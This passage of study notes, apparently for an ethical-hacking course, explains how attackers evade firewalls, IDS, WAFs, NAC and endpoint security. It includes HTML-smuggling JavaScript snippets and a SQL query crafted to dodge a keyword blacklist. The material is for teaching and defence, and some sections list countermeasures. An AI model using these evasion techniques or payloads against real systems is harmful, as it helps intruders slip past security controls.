				- HTTPort supports tunneling in two modes: SSL/CONNECT mode and remote host mode:
					- In SSL/CONNECT mode, HTTPort creates a tunnel through a proxy independently. This requires the proxy to support a specific HTTP feature called CONNECT HTTP, which is typically disabled by default. This mode is significantly faster but does not support encryption, allowing the proxy to monitor all activities.
					- The remote host mode enables tunneling through any proxy. HTTPort utilizes a specialized server software called HTTHost, which is installed outside the proxy-blocked network. Since HTTHost functions as a web server, HTTPort transmits a series of HTTP requests to it. The proxy interprets this as regular web browsing, thereby permitting the connection. HTTHost then completes its part of the tunneling process, communicating with the target servers. While this mode is slower, it is highly effective in most cases and offers strong data encryption, rendering proxy logging ineffective.
		- Bypassing IDS/Firewalls Using SSH Tunneling Method:
			- SSH protocol tunneling allows unencrypted network traffic to be securely transmitted through an SSH tunnel. For example, when transferring files using the unencrypted FTP protocol, but the target IDS/firewall blocks FTP traffic, data can be sent through an encrypted SSH tunnel instead. Attackers exploit this technique to bypass IDS/firewall restrictions by connecting to external SSH servers and creating SSH tunnels, often routing traffic through port 80 on the remote server to evade detection.
			- OpenSSH: Attackers use OpenSSH (OpenBSD Secure Shell) to encrypt and tunnel all traffic between a local machine and a remote machine, effectively bypassing perimeter security controls. OpenSSH is a suite of programs that enables encrypted communication sessions over a network using the SSH protocol.
			- Performing SSH Tunneling to Bypass Firewalls Using Bitvise (www.bitvise.com):
				- The Bitvise SSH Server provides secure remote login capabilities for Windows workstations and servers by encrypting data during transmission. It is commonly used for remote administration of Windows servers, allowing advanced users to access their home machine from work, their work machine from home, or perform complex tasks such as setting up a VPN using SSH TCP/IP tunneling or providing a secure file repository via SFTP.
				- Attackers can leverage the Bitvise SSH Server/Client tool to establish an SSH tunnel, bypassing IDS/firewalls and accessing restricted services in a target network through various port-forwarding methods.
				- Port-Forwarding Methods for SSH Tunneling Using Bitvise:
					- Local Port Forwarding: Local port forwarding redirects a local port to a remote port through an SSH tunnel, enabling access to remote services as if they were running locally. This technique allows attackers to reach internal resources that are otherwise inaccessible from outside the network.
					- Remote Port Forwarding: Remote port forwarding exposes a local service to a remote network by forwarding it to a local port on the remote machine. This technique enables attackers to access target-side applications or development environments within a remote network.
					- Dynamic Port Forwarding: Dynamic port forwarding creates a SOCKS proxy through an SSH tunnel, allowing the routing of various types of network traffic. This highly flexible method is often used to bypass firewalls, IDS, and other network restrictions, enabling access to unauthorized services without detection.
		- Bypassing IDS/Firewalls Using DNS Tunneling Method:
			- DNS tunneling is an effective technique for bypassing firewalls and intrusion detection systems (IDS) by exploiting the typically trusted nature of DNS traffic. Since DNS operates over UDP with a 255-byte limit on outbound queries and supports only alphanumeric characters and hyphens, it is well-suited for covert communication.
			- Attackers embed malicious data within DNS protocol packets, splitting the data into smaller chunks that are encoded within DNS queries and responses. This enables data exfiltration while evading detection. DNSSEC, the security extension of DNS, cannot identify abnormalities in DNS tunneling because the data is covertly embedded within legitimate DNS traffic.
			- Tools such as iodine and dnscat2 are commonly used to create DNS tunnels, allowing attackers to encode and decode data within DNS traffic effectively.
			- DNS Tunneling Using Iodine (code.kryo.se):
				- Attackers often use tools like iodine and dnscat2 to tunnel traffic through DNS port 53, bypassing network restrictions.
				- Iodine is a software program that enables IPv4 tunneling through a DNS server, allowing data transmission even when Internet access is restricted but DNS queries are allowed.
				- The tool consists of two components:
					- iodined (server): Runs on a server with a public IP address. It responds to DNS queries, decodes data from the client, accesses the Internet on behalf of the client, and then encodes responses into DNS replies.
					- iodine (client): Runs on the attacker's device, intercepting outgoing Internet traffic and encoding it into DNS queries sent to an iodined server.
				- This technique effectively allows data transmission through a DNS tunnel, bypassing firewalls and IDS.
		- Bypassing IDS/Firewall Using External Systems:
			- Attackers can evade firewall and IDS solutions by leveraging an external system that has access to the target network. This external system may include: An employee's home machine that connects to the corporate network, A remote administration machine used to manage the target network, A company-owned device located at a different physical location.
			- Steps to Bypass a Firewall/IDS Using External Systems:
				- A legitimate user accesses the corporate network through an external system.
				- The attacker intercepts the user’s traffic and steals session IDs and cookies.
				- The attacker gains access to the corporate network by bypassing the firewall/IDS and retrieves the Windows ID of the running Mozilla process on the user’s system.
				- The attacker issues an OpenURL() command to the identified window.
				- The user’s web browser is redirected to the attacker’s web server.
				- A malicious payload embedded in the attacker's web page is downloaded and executed on the user's machine.
		- Bypassing IDS/Firewall Using MITM Attacks:
			- Many security administrators focus on preventing external or internal threats from bypassing their firewall/IDS, often overlooking the fact that these security measures can be evaded through Man-in-the-Middle (MITM) attacks targeting DNS servers.
			- In MITM attacks, attackers manipulate DNS servers and routing techniques to circumvent firewall/IDS restrictions. This can be achieved by: Compromising the corporate DNS server to control domain name resolution and Spoofing DNS responses to redirect users to malicious sites.
			- Steps to Bypass a Firewall/IDS Using a MITM Attack:
				- The attacker performs DNS server poisoning, injecting false records into the DNS cache.
				- User A requests access to www.certifiedhacker.com from the corporate DNS server.
				- The compromised DNS server responds with the attacker’s IP address (127.22.16.64).
				- User A unknowingly connects to the attacker's malicious server instead of the legitimate one.
				- The attacker forwards the connection to the real host, tunneling the user's HTTP traffic, making it appear legitimate to the firewall/IDS.
				- Malicious code embedded in the attacker's webpage is downloaded and executed on the user’s machine, bypassing firewall/IDS detection.
		- Bypassing IDS/Firewall Using Malicious Content:
			- In this method, an attacker delivers malicious content to a user and tricks them into opening it, allowing the embedded code to execute. Attackers often use steganography or obfuscation techniques to hide malicious code within legitimate files, making it difficult for IDS to detect and firewall rules to block. A wide range of file formats for text, multimedia, and graphics can be used to deliver malicious content.
			- For example, an attacker might send an email containing a malicious executable file or a Microsoft Office document that exploits macro vulnerabilities. Attackers can also target WWW/FTP servers, embedding Trojan horse files within software installation packages, mobile applications, and other seemingly harmless downloads to lure users into opening them.
			- Common File Formats Used for Malicious Content:
				- Executable & Scripting Files: EXE, COM, BAT, PS
				- Documents & Spreadsheets:
					- Microsoft Word: DOC, DOT, CNV, ASD
					- Microsoft Excel: XLS, XLB, XLT
					- Microsoft PowerPoint: PPT, PPS, POT
					- Microsoft Outlook: MSG, OTM
					- Microsoft Access: ADP, MDA, MDB, MDE, MDN, MDZ
				- Design & CAD Files: CDR (CorelDraw), DWG (AutoCAD), DVB
				- Other Application Files:
					- Visio: VSD
					- MS Project: MPP, MPT
					- SMM (AMI Pro)
					- PDF (Portable Document Format)
		- Bypassing IDS/WAF Using XSS Attack:
			- Cross-Site Scripting (XSS) attacks exploit vulnerabilities in web applications that fail to properly handle user input and server responses. Attackers take advantage of these weaknesses to inject malicious HTML or JavaScript code into a website, bypassing Intrusion Detection Systems (IDS) and Web Application Firewalls (WAF). Many WAFs have built-in filters to block standard XSS payloads, attackers use different encoding and obfuscation techniques to bypass them.
			- Techniques to Bypass IDS/WAF Using XSS:
				- Using ASCII Values: In this method, attackers encode the XSS payload using ASCII character codes to evade WAF filtering. The encoded payload bypasses WAF filters by avoiding direct keyword detection.
				- Using Hex Encoding: In this technique, the entire XSS payload is converted into hexadecimal values, making it difficult for IDS/WAF to detect malicious intent. These payload is often generated using online converters (e.g., ConvertString.com) and successfully evades firewall filters.
				- Using Obfuscation: Obfuscation involves modifying the case of characters or adding unnecessary elements to bypass pattern-based security filters. By mixing uppercase and lowercase characters, this variation successfully bypasses IDS/WAF filters that rely on case-sensitive keyword detection.
			- Attackers use a combination of encoding, obfuscation, and evasion techniques to bypass WAF and IDS protections. Security administrators should implement advanced input validation, content security policies (CSP), and behavior-based detection methods to mitigate XSS threats effectively.
		- Bypassing IDS/Firewall Through HTML Smuggling:
			- HTML smuggling is a web-based attack where an attacker injects malicious code into an HTML script to compromise a web page. This technique allows attackers to manipulate scripting features (e.g., HTML5, JavaScript) and evade detection by SIEM solutions, firewalls, web proxies, and email gateways. The primary goal of HTML smuggling is to successfully install a malware payload on a target system when a victim accesses a malicious link sent via phishing emails.
			- To achieve this, attackers create a malicious link by embedding a JavaScript-based blob with a compatible MIME type, ensuring the malware is automatically downloaded upon execution. Tools like HTML Smuggler can be used to craft JavaScript payloads designed to bypass firewalls and IDS, delivering them through HTML attachments. Once executed, the malware grants remote access to the attacker, enabling persistent attacks.
			- Intrusion Detection Systems (IDS) and firewalls typically expect JavaScript and HTML traffic from clients. The smuggling technique exploits this trust by using JavaScript to conceal the blob content, allowing the malware to bypass detection and establish a connection with a malicious server.
			- How HTML Smuggling Works:
				- Embedding Malware in an HTML5 Attachment or Web Page: Attackers initiate the attack by embedding malware within an HTML5 attachment or web page. When a victim clicks the malicious link, the specially crafted malware is executed on their system. (<a href="malicious.doc" download="Myfile.doc">Click</a>)
				- Creating a Malicious File Using JavaScript Blob: Instead of directly linking to a malicious file URL, attackers use JavaScript's Blob API to generate and disguise the malware payload. (var fakeBlob = new Blob([myfakeFile], {type: 'application/octet-stream'}); var myAnchorElement = document.createElement('a'); myAnchorElement.download = 'Myfile.doc';)
				- Generating a URL and Triggering the Download: Attackers create a URL for the malicious file and trick the victim into downloading it. (var myfileUrl = window.URL.createObjectURL(fakeBlob); myAnchorElement.href = myfileUrl; myAnchorElement.click();)
			- Signs of HTML Smuggling:
				- A ZIP file containing JavaScript.
				- An encrypted attachment.
				- Suspicious script code embedded within an HTML-based file.
				- Decoding of an HTML-based file using Base64.
			- Countermeasures:
				- Block the auto-execution of .js and .jse files.
				- Ensure that Office 365 email security filtering actively prevents the auto-download of malware-laden emails.
				- Verify that security devices such as firewalls and proxies restrict arbitrary server connections to the Internet.
				- Recommend users access the web using a browser with Microsoft Defender SmartScreen and network protection enabled to prevent malicious access.
				- Enable cloud-based security solutions with AI and ML-driven threat detection for proactive identification and mitigation of threats.
				- Implement Content Security Policy (CSP) headers on web servers.
				- Define a whitelist of allowed HTML tags, attributes, and protocols.
				- Encode all dynamic content before rendering it in the browser to prevent code injection.
		- Evading IDS/Firewall Through Windows BITS:
			- In a Windows environment, the Background Intelligent Transfer Service (BITS) is a standard service used to distribute automatic Windows updates globally. While BITS offers significant advantages, it can also be exploited by attackers to bypass firewalls and IDS, as organizations often overlook BITS traffic due to its continuous flow of legitimate software updates.
			- Beyond Microsoft products, BITS also allows browsers like Firefox and Chrome to download and update their latest versions even when the browser is closed. While this service is legitimate, attackers can abuse it to execute malicious applications or establish backdoors, bypassing security solutions and gaining control over a system.
			- In the context of the service host process, malware can create BITS tasks to download or upload files discreetly. This technique enables attackers to evade IDS/firewall detection while concealing payload transfers.
			- BITS transfers are asynchronous, meaning the program that initiated the job does not need to be active when the transfer is completed. Attackers can exploit this functionality by specifying any executable or command within notification commands linked to BITS jobs, allowing them to keep malicious programs running. BITS jobs can be created using the Bitsadmin command-line tool or via API function calls.
			- Once the malicious payload is executed, it can create scheduled tasks or other jobs that run in the background. Since these jobs operate at a system level, they are often considered trusted and can bypass security solutions such as firewalls and IDS/IPS.
			- How Do Attackers Exploit BITS?
				- Downloading a Malicious Binary - Attackers run the Bitsadmin command to create a job, transfer a malicious file to a remote system, and store it in a specified location.
				- Establishing Persistence - Attackers can establish persistence on a target machine by specifying a NotifyCmdLine that executes when the BITS job completes.
			- Countermeasures:
				- Use the BitsParser tool to analyze all traffic passing through BITS.
				- Avoid downloading suspicious programs or files from the internet or email.
				- Keep the operating system and BITS service updated with the latest security patches.
				- Regularly monitor the Microsoft-Windows-BITS-Client/Operational event log for unusual activities.
				- Integrate with a reputable SIEM solution to automate the monitoring and alerting of suspicious BITS activity.
				- Use Group Policy Objects (GPO) to manage and restrict BITS settings.
				- Configure BITS to limit the maximum job age and prevent jobs from running immediately.
				- Conduct regular audits of BITS jobs to detect unauthorized activity.
				- Restrict user accounts from creating BITS jobs unless necessary.
	- Techniques for Bypassing WAF:
		- Using HTTP Header Spoofing:
			- Web application firewalls allow specific queries and syntaxes that originate from internal addresses. They also enable rapid debugging of applications in test environments. Attackers exploit this functionality by sending requests with spoofed headers, tricking the target WAF and server into believing that the request originated from the internal network. Tools like Burp Suite are commonly used to manipulate HTTP headers and bypass the WAF.
		- Using Blacklist Detection:
			- Attackers can exploit the WAF's blacklist detection mechanism to bypass its security controls. To do this, they fingerprint the target WAF to identify blacklisted keywords. Once identified, they craft new regex patterns and payloads using keywords that are not included in the blacklist.
			- Example of filtered keywords: AND, OR, UNION
			- SQL query that evades detection: 1 || (SELECT username, pwd FROM employees WHERE userID = 1001) = 'admin'
		- Using Fuzzing/Brute-Forcing:
			- In this technique, attackers test the target WAF with multiple known payloads to find ways to bypass its security controls. While WAFs can typically detect fuzzing and brute-force attempts, attackers evade detection by first testing payloads on a locally connected WAF to identify those that can slip through. They then use the successful payloads against the target WAF.
			- To perform fuzzing, attackers use wordlists such as Assetnote Wordlists (wordlists.assetnote.io) and SecLists (github.com).
			- Process:
				- Load the wordlist into a fuzzer to initiate brute-force attempts.
				- Record the responses received for each fuzzed payload.
				- Use random user agents and proxy chains to further evade WAF detection.
		- Abusing SSL/TLS Ciphers;
			- In some cases, a target web server may accept connections using various SSL/TLS ciphers, but the filtering WAF might not support all of them. Attackers exploit this discrepancy to bypass the WAF.
			- First, attackers analyze the target WAF to identify its supported ciphers, often by reviewing vendor documentation. They then use tools such as sslscan2 to detect the ciphers supported by the web server. If they find a cipher that the web server supports but the WAF does not, they use that cipher to bypass the WAF and establish a direct connection with the target server.
			- Attackers commonly use tools like abuse-ssl-bypass-waf.py (github.com) and cURL (curl.se) to carry out this attack.
	- Techniques for IDS Evasion:
		- Insertion Attack:
			- Insertion attacks exploit discrepancies between an IDS and the target system’s packet processing. Attackers send malformed or manipulated packets that the IDS accepts but the target system discards, causing the IDS to misinterpret traffic as harmless. IDSs rely on pattern matching to detect threats, but attackers can insert extra data to disrupt this process. For example, modifying "phf" to "phoneyf" can prevent IDS detection of a PHF CGI attack.
			- Common insertion techniques include corrupting IP checksums—causing the IDS to process invalid packets—and manipulating Time-to-Live (TTL) fields so packets reach the IDS but expire before reaching the target. These tactics create mismatched data streams, leading the IDS to draw incorrect conclusions.
		- Evasion Attack:
			- An evasion attack occurs when an IDS discards packets that the target host accepts, allowing an attacker to exploit the system unnoticed. This attack reduces IDS accuracy and enables arbitrary attacks at the IP layer without detection.
			- Attackers achieve this by sending request fragments in packets that the IDS mistakenly rejects, effectively removing parts of the data stream from its view. For example, if an attacker sends a malicious sequence byte by byte and the IDS drops just one byte, it may fail to detect the attack. In this case, the IDS processes fewer packets than the destination system.
			- One example is an attacker opening a TCP connection with a data packet. Normally, a TCP connection begins with a handshake between two endpoints. However, since TCP handshake packets can carry data, an IDS that ignores this data is vulnerable to evasion attacks.
		- Denial-of-Service (DoS) Attack on IDS:
			- Multiple types of Denial-of-Service (DoS) attacks can disrupt an Intrusion Detection System (IDS) by exhausting its resources. Attackers target critical network processing points, forcing the IDS to allocate excessive CPU cycles, memory, disk space, and bandwidth, ultimately degrading its performance or rendering it ineffective. By exploiting these vulnerabilities, attackers can neutralize IDS defenses and evade detection.
			- Targeting IDS Resources:
				- CPU Overload: The IDS requires CPU cycles to analyze packets and compare them against stored network states. Attackers exploit computationally expensive operations, forcing the IDS into performing useless work and consuming all processing power.
				- Memory Exhaustion: IDSs need memory for pattern matching, tracking TCP connections, reassembling packets, and buffering data. Attackers identify and exploit memory-intensive operations, causing the system to allocate all memory to meaningless information.
				- Disk Space Consumption: IDS logs network activity, often storing events on disk. Attackers can flood the system with excessive events, consuming disk space and preventing legitimate alerts from being recorded.
				- Network Overload: Unlike end systems, an IDS must analyze all network traffic. Attackers can flood the network with meaningless data, overwhelming the IDS and preventing it from keeping up with legitimate activity.
			- Attacking Centralized Logging Systems: Many IDSs use central logging servers to consolidate alerts. If attackers discover the log server’s IP address, they can launch a DoS attack to slow it down or crash it. Once disabled, the IDS fails to record alerts, allowing further attacks to go unnoticed.
			- Effects of DoS Attack on IDS:
				- Device lock-up, making it unresponsive
				- Overwhelming alarms, preventing proper investigation
				- Exceeding management system capacity (e.g., databases)
				- Filling disk space, stopping attack logs from being stored
				- Consuming processing power, allowing real attacks to bypass detection
		- Obfuscation:
			- Obfuscation involves making code or data difficult to understand, often for privacy or security purposes. Attackers use this technique to evade Intrusion Detection Systems (IDS) by encoding attack payloads in a way that the target system can decode, but the IDS cannot. By leveraging obfuscation, attackers effectively evade IDS detection while successfully compromising their targets.
			- Obfuscation Techniques:
				- Path Manipulation: Attackers alter file paths in ways that confuse Host-based IDS (HIDS) while remaining valid for the target system.
				- Unicode Encoding: By encoding attack packets with Unicode characters, an attacker can bypass detection by the IDS while still being understood by a web server, such as Microsoft IIS.
				- Polymorphic Code: Attackers generate variable attack patterns to evade signature-based IDS, ensuring there is no single detectable signature.
				- Encrypted Protocols: Obfuscated attacks on HTTPS make it difficult for IDS to inspect traffic.
				- Digital Steganography: Attackers hide malicious payloads within digital files, allowing them to bypass IDS and deploy malware on target systems.
		- False Positive Generation:
			- This technique does not directly attack the target but instead triggers unnecessary IDS alerts, causing false positives—alarms generated without an actual threat. A method similar to Denial-of-Service (DoS) attacks, false positive generation overwhelms the IDS with excessive alert data. Attackers send malicious packets designed to trigger IDS alerts, flooding logs with noise. This makes it harder to distinguish real threats from false alarms.
			- By understanding the IDS's detection mechanisms, attackers can craft alerts specific to that system, further masking real attack traffic. As a result, legitimate threats blend into the noise, allowing attackers to evade detection.
		- Session Splicing:
			- Session splicing is an IDS evasion technique that exploits weaknesses in how some Intrusion Detection Systems (IDS) reconstruct sessions before performing pattern matching. Attackers split malicious traffic into numerous small packets, ensuring that no single packet contains a recognizable attack signature, making detection difficult.
			- How Session Splicing Works:
				- Fragmenting Attack Traffic: The attacker sends data in tiny portions (a few bytes per packet), avoiding IDS string matching.
				- Overloading IDS Processing: Some IDS struggle to handle an excessive number of small packets, failing to detect attack patterns.
				- Delaying Packet Transmission: If attackers know the IDS type, they can introduce delays between packets to evade reassembly-based detection. Many IDS time out reassembly after a set period, while some applications keep sessions active longer. Attackers exploit this mismatch to inject malicious payloads after the IDS stops monitoring.
				- Bypassing IDS Logging: Once session splicing succeeds, subsequent attack data bypasses IDS detection and is not logged.
			- Attackers often use tools like Nessus to perform session-splicing attacks, making detection and prevention challenging for IDS that do not properly reassemble fragmented traffic.
		- Unicode Evasion Technique:
			- Unicode is a character encoding system that ensures consistent text representation across different languages and platforms. Many standards, including Java, LDAP, and XML, require Unicode, and most operating systems and applications support it.
			- How Attackers Use Unicode for IDS Evasion: Attackers exploit Unicode character encodings (known as code points) to manipulate text in a way that bypasses pattern-matching IDS detection. The most common encoding formats used are UTF-8 and UTF-16.
			- Challenges with Unicode in IDS
				- Unicode allows multiple representations of the same character, making pattern-matching difficult.
				- Certain code points can modify previous code points, adding further complexity.
				- Different OS and applications may assign the same representation to different code points, leading to inconsistencies.
			- For example, the character \ (backslash) can be represented as 5C, C19C, or E0819C, making it difficult for IDS to detect malicious strings. Attackers leverage this by converting attack payloads into Unicode characters, effectively evading signature-based detection. Additionally, attackers encode URLs in HTTP requests using Unicode, allowing them to bypass HTTP-based attack detection in IDS.
		- Fragmentation Attack:
			- IP packets must adhere to the Maximum Transmission Unit (MTU) size when traveling across a network. If a packet exceeds this size, it is fragmented into smaller parts for transmission. Each fragment contains information such as fragment ID, offset, length, and flags, which help in reassembling the original packet at the destination.
			- Fragmentation can be exploited as an IDS evasion technique when reassembly timeouts differ between the IDS and the target system. Attackers manipulate fragmentation to send malicious payloads while bypassing IDS detection. By carefully manipulating fragmentation timeouts and packet sequences, attackers can execute stealthy attacks that bypass IDS detection.
			- Attack Scenario 1: IDS Timeout Expires Before the Target's Timeout
				- If the IDS reassembly timeout is shorter than that of the target system, attackers can delay fragment transmissions to evade detection. This allows the attack to succeed without triggering IDS alerts, as the IDS never sees the complete packet.
				- Example:
					- IDS reassembly timeout: 10 seconds
					- Target system timeout: 20 seconds
					- Attack strategy: The attacker sends the second fragment 15 seconds after the first.
					- Outcome: The IDS drops the fragment as its timeout has expired, but the target system still accepts and reassembles the full payload.
			- Attack Scenario 2: IDS Timeout Exceeds the Target's Timeout
				- If the IDS reassembly timeout is longer than that of the target system, an attacker can send misleading fragments to deceive the IDS. This technique allows attackers to fool the IDS into dropping attack data while successfully delivering the malicious payload to the target system.
				- Example:
					- IDS reassembly timeout: 60 seconds
					- Target system timeout: 30 seconds
					- Attack strategy: The attacker first sends frag-2' and frag-4' with false payloads, received by both the IDS and the target. After the target's timeout expires (30s), it discards the incomplete fragments. The attacker then sends frag-1 and frag-3 with the actual payload, causing the IDS to detect a checksum mismatch and drop the packet. Finally, the attacker resends frag-2 and frag-4 with the correct payload, allowing the target to reassemble the full attack, while the IDS remains unaware.
		- Time-To-Live (TTL) Attacks:
			- Each IP packet has a Time-To-Live (TTL) field that determines how many hops the packet can take before being discarded. Each router along the path decrements the TTL value by 1. When TTL reaches 0, the packet is dropped, and an ICMP alert is sent to the sender. Different OS use different default TTL values, allowing attackers to infer a host’s OS and network topology using tools like traceroute.
			- Attack Scenario:
				- An attacker exploits a router between the IDS and the victim by fragmenting a malicious packet:
				- Frag-1 is sent with a high TTL, reaching both the IDS and the victim.
				- Frag-2' (false payload) is sent with TTL = 1, reaching only the IDS, but not the victim (discarded by the router).
				- Frag-3 (correct payload) is sent with a high TTL, reaching both IDS and victim.
				- The IDS reassembles Frag-1, Frag-2' (false), and Frag-3, forming an invalid packet.
				- The attacker resends Frag-2 with the correct payload. The victim reassembles Frag-1, Frag-2, and Frag-3, successfully reconstructing the attack payload.
				- Since the IDS already processed the earlier (false) fragments, it does not detect the attack.
			- This technique allows attackers to bypass IDS detection by manipulating TTL values to control which fragments reach the victim versus the IDS.
		- Urgency Flag (URG) Attack:
			- The URG (Urgent) flag in TCP marks data as urgent, allowing it to be processed immediately. TCP uses an Urgent Pointer to indicate where the urgent data begins, ignoring all preceding data. If the URG flag is set, the Urgent Pointer (a 16-bit offset) points to the last byte of urgent data in the segment.
			- Exploitation Technique:
				- Some IDS do not properly handle the TCP urgency feature and process all packet data, whereas the target system processes only the urgent data. Attackers exploit this by:
				- Injecting garbage data before the urgent data.
				- The IDS reads all packet data, including garbage, whereas the target system processes only urgent data.
				- This mismatch results in the IDS and target system seeing different data, allowing attackers to bypass detection and deliver malicious payloads unnoticed.
			- According to RFC 1122, when an Urgent Pointer is used, one byte of data after the urgent data may be lost, further complicating IDS detection.
		- Invalid RST Packets Attack:
			- TCP uses 16-bit checksums for error detection and ensures reliable communication. Each transmitted segment includes a checksum, which the receiver verifies. If the checksum is incorrect, the receiver drops the packet. TCP also uses RST (Reset) packets to terminate connections. Attackers exploit this by sending RST packets with invalid checksums, leading to:
				- The IDS misinterpreting the invalid RST packet as a legitimate session termination and stopping traffic analysis.
				- The end host verifying the checksum, detecting it as invalid, and ignoring the RST packet.
				- Attackers continuing communication with the end host, while the IDS remains unaware, allowing evasion of detection.
			- Some IDS may incorrectly assume that the connection has ended after receiving the invalid RST packet, failing to monitor subsequent malicious traffic.
		- Polymorphic Shellcode:
			- A signature-based Network Intrusion Detection System (NIDS) detects attacks by matching packet data against known attack signatures. Many IDS identify common shellcode patterns embedded in exploits.
			- Polymorphic shellcode evades detection by constantly modifying its structure. Attackers achieve this by:
				- Encoding the payload and inserting a decoder before it.
				- Encrypting the shellcode using an unknown encryption algorithm, with the decryption code embedded in the attack packet.
				- Using a buffer overflow exploit to overwrite the return address, directing execution to the decryption code instead of a known shellcode signature.
			- Since the shellcode is rewritten with every transmission, traditional signature-based IDS fail to detect it, as predefined shellcode signatures become ineffective.
		- ASCII Shellcode:
			- ASCII shellcode consists solely of characters from the ASCII standard, allowing attackers to bypass character restrictions in string inputs and evade IDS pattern-matching. Like polymorphic shellcode, ASCII shellcode obscures attack strings, making IDS detection less effective.
			- However, using only ASCII characters restricts the shellcode’s functionality, as not all assembly instructions directly translate into ASCII values. To overcome this limitation, attackers use alternative instructions or a combination of ASCII-compatible operations to achieve the same execution flow while maintaining ASCII compliance.
		- Application-Layer Attacks:
			- Media files such as images, audio, and video are often compressed to enable faster data transfer. Attackers exploit flaws in compressed data to embed malicious code, making it difficult for IDS signatures to detect the attack. Many applications that process media files use compression, but if vulnerabilities exist in these applications, attacks can occur within the compressed data, bypassing IDS detection.
			- Most IDS solutions rely on pattern matching to identify attack conditions. However, attack variations, such as integer overflow exploits using different integer values, further complicate detection. When combined with compression, these techniques make signature-based IDS ineffective against such attacks.
		- Desynchronization Attacks:
			- Pre-Connection SYN:
				- This attack involves sending an initial SYN packet with an invalid TCP checksum before the actual connection is established. Depending on its design, the IDS may accept or ignore subsequent SYN packets in the same connection. If an IDS resets sequence numbers based on newly received SYN packets, attackers can send fake SYN packets with incorrect sequence numbers to desynchronize the IDS. This prevents the IDS from correctly tracking legitimate and malicious traffic.
				- If the IDS does not verify TCP checksums, the attack can proceed undetected. However, if the IDS validates checksums, attackers synchronize the attack by sending a fake sequence number to the IDS before the real connection is established.
			- Post-Connection SYN:
				- In this method, attackers desynchronize the IDS from the actual sequence numbers used by the target system. They send a SYN packet within an ongoing data stream, which contains a different sequence number but meets all other criteria to be accepted.
				- The target host ignores this SYN packet since the connection is already established, but the IDS may update its sequence number tracking based on the new SYN. As a result, the IDS fails to recognize legitimate traffic from the original stream, since it now expects a different sequence number.
				- Once the IDS is successfully resynchronized with the incorrect sequence number, attackers send an RST packet using the new sequence number to force the IDS to close its tracking of the connection, while the real communication remains unaffected.
		- Domain Generation Algorithms (DGA):
			- A domain generation algorithm (DGA) is a technique used by attackers to dynamically generate large numbers of domain names for command and control (C2) communication. This allows them to evade traditional security measures such as security gateways and signature-based filters, which typically block static IP addresses and known malicious domains. By frequently changing domains, attackers make it difficult for defenders to disrupt their operations.
			- How DGAs Work:
				- DGAs generate random-looking domain names that act as rendezvous points for malware to communicate with C2 servers. For example, a DGA might create gibberish-like domain names such as "isdfcbdjdnfuylt.ru". These domains are often unregistered, making it challenging for security tools to rely on IP reputation or domain blacklists to detect threats.
				- The DGA algorithm runs on both the attacker's infrastructure and the malware-infected machine, using a shared starting value called a "seed". This seed allows both the attacker and the malware to predict and generate the same domain names at a given time. If a security system detects or blocks a domain, the attacker can quickly switch to another, maintaining continuous communication with the C2 server.
			- Types of DGAs:
				- Attackers use different types of DGAs to improve evasion and effectiveness. Some common types include:
				- Character-based DGAs: Generates domains using randomized letters and numbers. Example: "ab5cde8.com", "xy12z34.net"
				- Pseudo Random Number Generator (PRNG) DGAs: Uses a random seed (e.g., system date/time) to generate predictable domain sequences. Example: If the seed generates 837291056, and numbers are mapped to letters (1 = a, 2 = b, etc.), the domain could be "hbeajidfg.com".
				- Dictionary-based DGAs: Combines random real words to create more legitimate-looking domain names, making detection harder. Example: "applebanana.com", "orangekiwi.net"
				- High-collision DGAs: Mimics real domain names and uses popular TLDs (.com, .org, .net), increasing the chance of generating an already-registered domain, which can confuse security systems. Example: "test.com", "demo.org"
		- Encryption:
			- Network-based intrusion detection systems (NIDS) analyze traffic from source to destination to detect threats. However, if an attacker establishes an encrypted session with the target using protocols like Secure Shell (SSH), Secure Socket Layer (SSL), or Virtual Private Network (VPN) tunnels, the IDS cannot inspect the encrypted packets. This allows attackers to transmit malicious traffic securely, bypassing IDS detection.
		- Flooding:
			- Intrusion detection systems rely on computational resources such as memory and processing power to analyze network traffic. Attackers can overload an IDS by flooding it with excessive noise or fake traffic, exhausting its resources. Once the IDS is overwhelmed, it becomes incapable of effectively analyzing legitimate traffic. At this point, attackers can inject actual malicious payloads into the network, which may go undetected due to system overload.
- Evading NAC and Endpoint Security:
	- Network Access Control (NAC) is a security mechanism designed to prevent unauthorized or unknown devices from accessing internal network resources. However, attackers often attempt to bypass NAC using various techniques to conduct malicious activities within the target network.
	- Endpoint security adds an additional layer of protection to end-user devices such as desktops, laptops, tablets, and digital printers, safeguarding them against malware and other cyber threats. Despite this, attackers employ sophisticated evasion techniques to bypass Endpoint Detection and Response (EDR) solutions, enabling them to infect devices with malware, establish command and control (C2), and maintain persistence while avoiding detection.
	- NAC and Endpoint Security Evasion Techniques:
    	- Bypassing NAC Using VLAN Hopping:
			- Attackers use VLAN hopping to gain unauthorized access to a network through the Dynamic Trunking Protocol (DTP). To establish a trunk connection with a switch, attackers send specially crafted DTP packets while configuring the switch mode to "dynamic auto" or "dynamic desirable." Once the trunk is established, attackers can access multiple VLANs, bypassing network segmentation.
			- VLAN Hopping Tools - VLANPWN:
				- VLANPWN is a simple script used for VLAN enumeration and hopping. It consists of two Python scripts designed to facilitate VLAN-hopping attacks:
				- DoubleTagging.py: Executes a VLAN-hopping attack by injecting a frame with two 802.1Q tags. Additionally, it sends a test ICMP request.
				- DTPHijacking.py: Conducts a DTP-switch spoofing/hijacking attack by sending a malicious DTP-desirable frame, converting the attacker's machine into a trunk channel. This method allows attackers to bypass VLAN segmentation and gain access to all VLAN traffic.
		- Bypassing NAC Using Pre-Authenticated Device:
			- Attackers can gain access to a pre-authenticated device and use it to bypass Network Access Control (NAC). They achieve this by inserting their own device (e.g., a Raspberry Pi) between the authenticated device and the network switch, allowing traffic to flow through their system undetected. This method enables attackers to inject unauthorized network packets while maintaining the appearance of a legitimate connection.
			- Tools to Bypass NAC Using a Pre-Authenticated Device:
				- nac_bypass_setup.sh:
					- A fundamental requirement for NAC bypassing is access to a device that has already been authenticated on the network. Attackers leverage this trusted device to log in and then introduce unauthorized network traffic from an external device.
					- This technique involves placing the attacker's system between the network switch and the authenticated device. One common approach is using a Raspberry Pi with two network adapters to facilitate the interception and relay of network communications.

				- NACkered (github.com)
				- Silentbridge (github.com)
				- BITM (github.com)
		- Bypassing Endpoint Security Using Ghostwriting:
			- Ghostwriting is a technique used to bypass endpoint security by modifying the structure of malware code without affecting its functionality. This is achieved by deconstructing assembly code and inserting arbitrary instructions. Attackers use this method to evade antivirus detection and bypass security agents on endpoint devices by disguising malware to avoid signature-based detection.
			- Ghostwriting Tools:
				- Ghostwriting.sh:
